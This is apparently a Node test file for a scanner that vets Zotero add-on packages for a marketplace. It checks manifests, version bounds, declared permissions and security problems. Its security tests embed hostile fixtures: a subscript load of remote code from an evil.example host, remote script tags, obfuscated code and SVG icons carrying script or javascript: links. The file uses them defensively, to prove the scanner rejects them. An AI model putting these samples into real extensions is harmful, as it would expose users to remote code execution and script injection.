import { test } from "node:test";
import assert from "node:assert/strict";
import { inspectXpi } from "../scripts/lib/inspect.mjs";
import { compareVersions, isCompatible } from "../scripts/lib/version.mjs";
import { config, listing, manifest, xpi } from "./helpers.mjs";

const codes = (result, level) => result.findings.filter((f) => !level || f.level === level).map((f) => f.code);

test("a plain extension passes with nothing to report", () => {
  const result = inspectXpi(xpi(), { listing: listing(), config });
  assert.equal(result.ok, true);
  assert.deepEqual(result.findings, []);
  assert.equal(result.version, "1.0.0");
  assert.equal(result.minAppVersion, "9.0");
  assert.equal(result.maxAppVersion, "11.*");
  // The smallest icon of at least 64px.
  assert.equal(result.icon.path, "icon-96.png");
  assert.equal(result.icon.type, "image/png");
});

test("the manifest must match the listing and point updates at the marketplace", () => {
  const result = inspectXpi(
    xpi({ manifest: manifest({ zotero: { id: "other@example.com", update_url: "https://example.com/u.json" } }) }),
    { listing: listing(), config },
  );
  assert.equal(result.ok, false);
  assert.deepEqual(codes(result, "error").sort(), ["id-mismatch", "update-url"]);
});

test("an extension without bootstrap.js or version bounds is rejected", () => {
  const result = inspectXpi(
    xpi({ manifest: manifest({ zotero: { strict_max_version: undefined } }), files: { "bootstrap.js": null } }),
    { listing: listing(), config },
  );
  assert.deepEqual(codes(result, "error").sort(), ["bootstrap-missing", "compat-missing"]);
});

test("code from the internet and obfuscated code are rejected", () => {
  const obfuscated = Array.from({ length: 30 }, (_, i) => `var _0x${(0xa000 + i).toString(16)}=1;`).join("");
  const result = inspectXpi(
    xpi({
      files: {
        "content/load.js": 'Services.scriptloader.loadSubScript("https://evil.example/x.js", this);',
        "content/page.xhtml": '<script src="https://cdn.example/lib.js"></script>',
        "content/o.js": obfuscated,
      },
    }),
    { listing: listing(), config },
  );
  assert.equal(result.ok, false);
  assert.deepEqual(codes(result, "error").sort(), ["obfuscated", "remote-code", "remote-code"]);
});

test("a script tag loading from the internet is found however it is written, and quickly", () => {
  const tags = [
    '<script type="module" src="https://cdn.example/lib.js"></script>',
    `<script data-pad="${"x".repeat(5000)}" SRC = 'http://cdn.example/lib.js'>`,
    '<script <script src="https://cdn.example/lib.js">',
  ];
  for (const tag of tags) {
    const result = inspectXpi(xpi({ files: { "content/page.html": tag } }), { listing: listing(), config });
    assert.deepEqual(codes(result, "error"), ["remote-code"], tag.slice(0, 40));
  }
  const local = '<script src="chrome://hello/content/a.js"></script><img src="https://example.com/a.png">';
  assert.equal(inspectXpi(xpi({ files: { "content/page.html": local } }), { listing: listing(), config }).ok, true);

  // A megabyte of "<script " with no ">" took a minute with a backtracking
  // pattern; the release fits easily in the size limit once deflated.
  const started = Date.now();
  const result = inspectXpi(xpi({ files: { "content/page.html": "<script ".repeat(128 * 1024) } }), {
    listing: listing(),
    config,
  });
  assert.equal(result.ok, true);
  assert.ok(Date.now() - started < 5000, `took ${Date.now() - started} ms`);
});

test("code too large to scan is refused without being read, and a broken archive stops the scan", () => {
  const huge = inspectXpi(xpi({ files: { "content/big.js": "a".repeat(9 * 1024 * 1024) } }), { listing: listing(), config });
  assert.deepEqual(codes(huge, "error"), ["file-too-large"]);

  // Two damaged files: the first stops the scan.
  const bytes = xpi({ files: { "content/a.js": "let a = 1;", "content/b.js": "let b = 2;" } });
  for (const text of ["let a = 1;", "let b = 2;"]) {
    bytes[bytes.indexOf(text)] ^= 1;
  }
  assert.deepEqual(codes(inspectXpi(bytes, { listing: listing(), config }), "error"), ["unreadable"]);
});

test("an SVG icon that is more than a picture is not shown", () => {
  const withIcon = (svg) =>
    inspectXpi(xpi({ manifest: manifest({ icons: { 96: "icon.svg" } }), files: { "icon.svg": svg } }), {
      listing: listing(),
      config,
    });
  const unsafe = [
    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
    '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><div/></foreignObject></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="https://evil.example/"><rect/></a></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a></svg>',
    Buffer.from("\ufeff<svg><script>alert(1)</script></svg>", "utf16le"),
  ];
  for (const svg of unsafe) {
    const result = withIcon(svg);
    assert.equal(result.ok, true);
    assert.equal(result.icon, null, String(svg));
    assert.ok(codes(result, "notice").includes("icon-unsafe"), String(svg));
  }
  const safe = withIcon('<svg xmlns="http://www.w3.org/2000/svg"><defs><path id="p" d="M0 0h9"/></defs><use href = "#p"/></svg>');
  assert.equal(safe.icon.type, "image/svg+xml");
  assert.deepEqual(safe.findings, []);
});

test("what the code uses is compared with what the listing declares", () => {
  const files = {
    "content/a.js": [
      "Services.cookies.getCookiesFromHost(h, {});",
      "Zotero.Utilities.Internal.copyTextToClipboard(t);",
      'fetch("https://api.example.com/v1");',
      'fetch("https://other.example.net/");',
      'el.setAttribute("xmlns", "http://www.w3.org/1999/xhtml");',
    ].join("\n"),
  };
  const undeclared = inspectXpi(xpi({ files }), { listing: listing(), config });
  assert.equal(undeclared.ok, true);
  assert.deepEqual(undeclared.detected.uses, ["clipboard", "cookies"]);
  assert.deepEqual(undeclared.detected.hosts, ["api.example.com", "other.example.net"]);
  assert.deepEqual(codes(undeclared, "warning").sort(), ["undeclared-clipboard", "undeclared-cookies"]);
  assert.deepEqual(codes(undeclared, "notice"), ["undeclared-hosts"]);

  const declared = inspectXpi(xpi({ files }), {
    listing: listing({ declares: { cookies: true, clipboard: true, network: ["example.com", "example.net"] } }),
    config,
  });
  assert.deepEqual(declared.findings, []);
});

test("sending content without a privacy policy is a warning", () => {
  const result = inspectXpi(xpi(), { listing: listing({ declares: { sendsContent: true } }), config });
  assert.deepEqual(codes(result), ["no-privacy-policy"]);
});

test("a version Paperly would refuse is listed with a warning", () => {
  const result = inspectXpi(xpi({ manifest: manifest({ zotero: { strict_max_version: "10.*" } }) }), {
    listing: listing(),
    config,
  });
  assert.equal(result.ok, true);
  assert.deepEqual(codes(result), ["incompatible"]);
});

test("oversized and broken files are refused before anything else", () => {
  assert.deepEqual(codes(inspectXpi(Buffer.alloc(config.maxXpiBytes + 1), { listing: listing(), config })), [
    "too-large",
  ]);
  assert.deepEqual(codes(inspectXpi(Buffer.from("x".repeat(100)), { listing: listing(), config })), ["not-a-zip"]);
  assert.deepEqual(codes(inspectXpi(xpi({ files: { "manifest.json": "{" } }), { listing: listing(), config })), [
    "manifest-invalid",
  ]);
});

test("versions compare the way the add-on manager compares them", () => {
  assert.equal(compareVersions("1.0", "1.0.0"), 0);
  assert.equal(compareVersions("1.0b2", "1.0"), -1);
  assert.equal(compareVersions("1.10", "1.9"), 1);
  assert.equal(compareVersions("11.0", "11.*"), -1);
  assert.equal(isCompatible("11.0", "9.0", "11.*"), true);
  assert.equal(isCompatible("11.0", "9.0", "10.*"), false);
  assert.equal(isCompatible("11.0", "11.1", "12.*"), false);
});

test("versions compare like Gecko's ParseVP in its corners", () => {
  // A "+" part is the next number's "pre".
  assert.equal(compareVersions("1.0+", "1.1pre"), 0);
  assert.equal(compareVersions("1.0+", "1.0"), 1);
  assert.equal(compareVersions("1.0+", "1.0.5"), 1);
  assert.equal(isCompatible("11.0", "9.0", "11.0+"), true);
  // The text part ends at a digit, "+" or "-", and the number after it may
  // carry a sign.
  assert.equal(compareVersions("1.0a+1", "1.0a1"), 0);
  assert.equal(compareVersions("1.0a-1", "1.0a"), -1);
  assert.equal(compareVersions("1.0a1x", "1.0a1"), -1);
  // Numbers outside int32 count as 0, and "*" is above every number.
  assert.equal(compareVersions("1.99999999999", "1.0"), 0);
  assert.equal(compareVersions("1.*", "1.999999999"), 1);
  // Missing parts and empty parts are 0.
  assert.equal(compareVersions("1.", "1.0.0"), 0);
  assert.equal(compareVersions("1..2", "1.0.2"), 0);
});
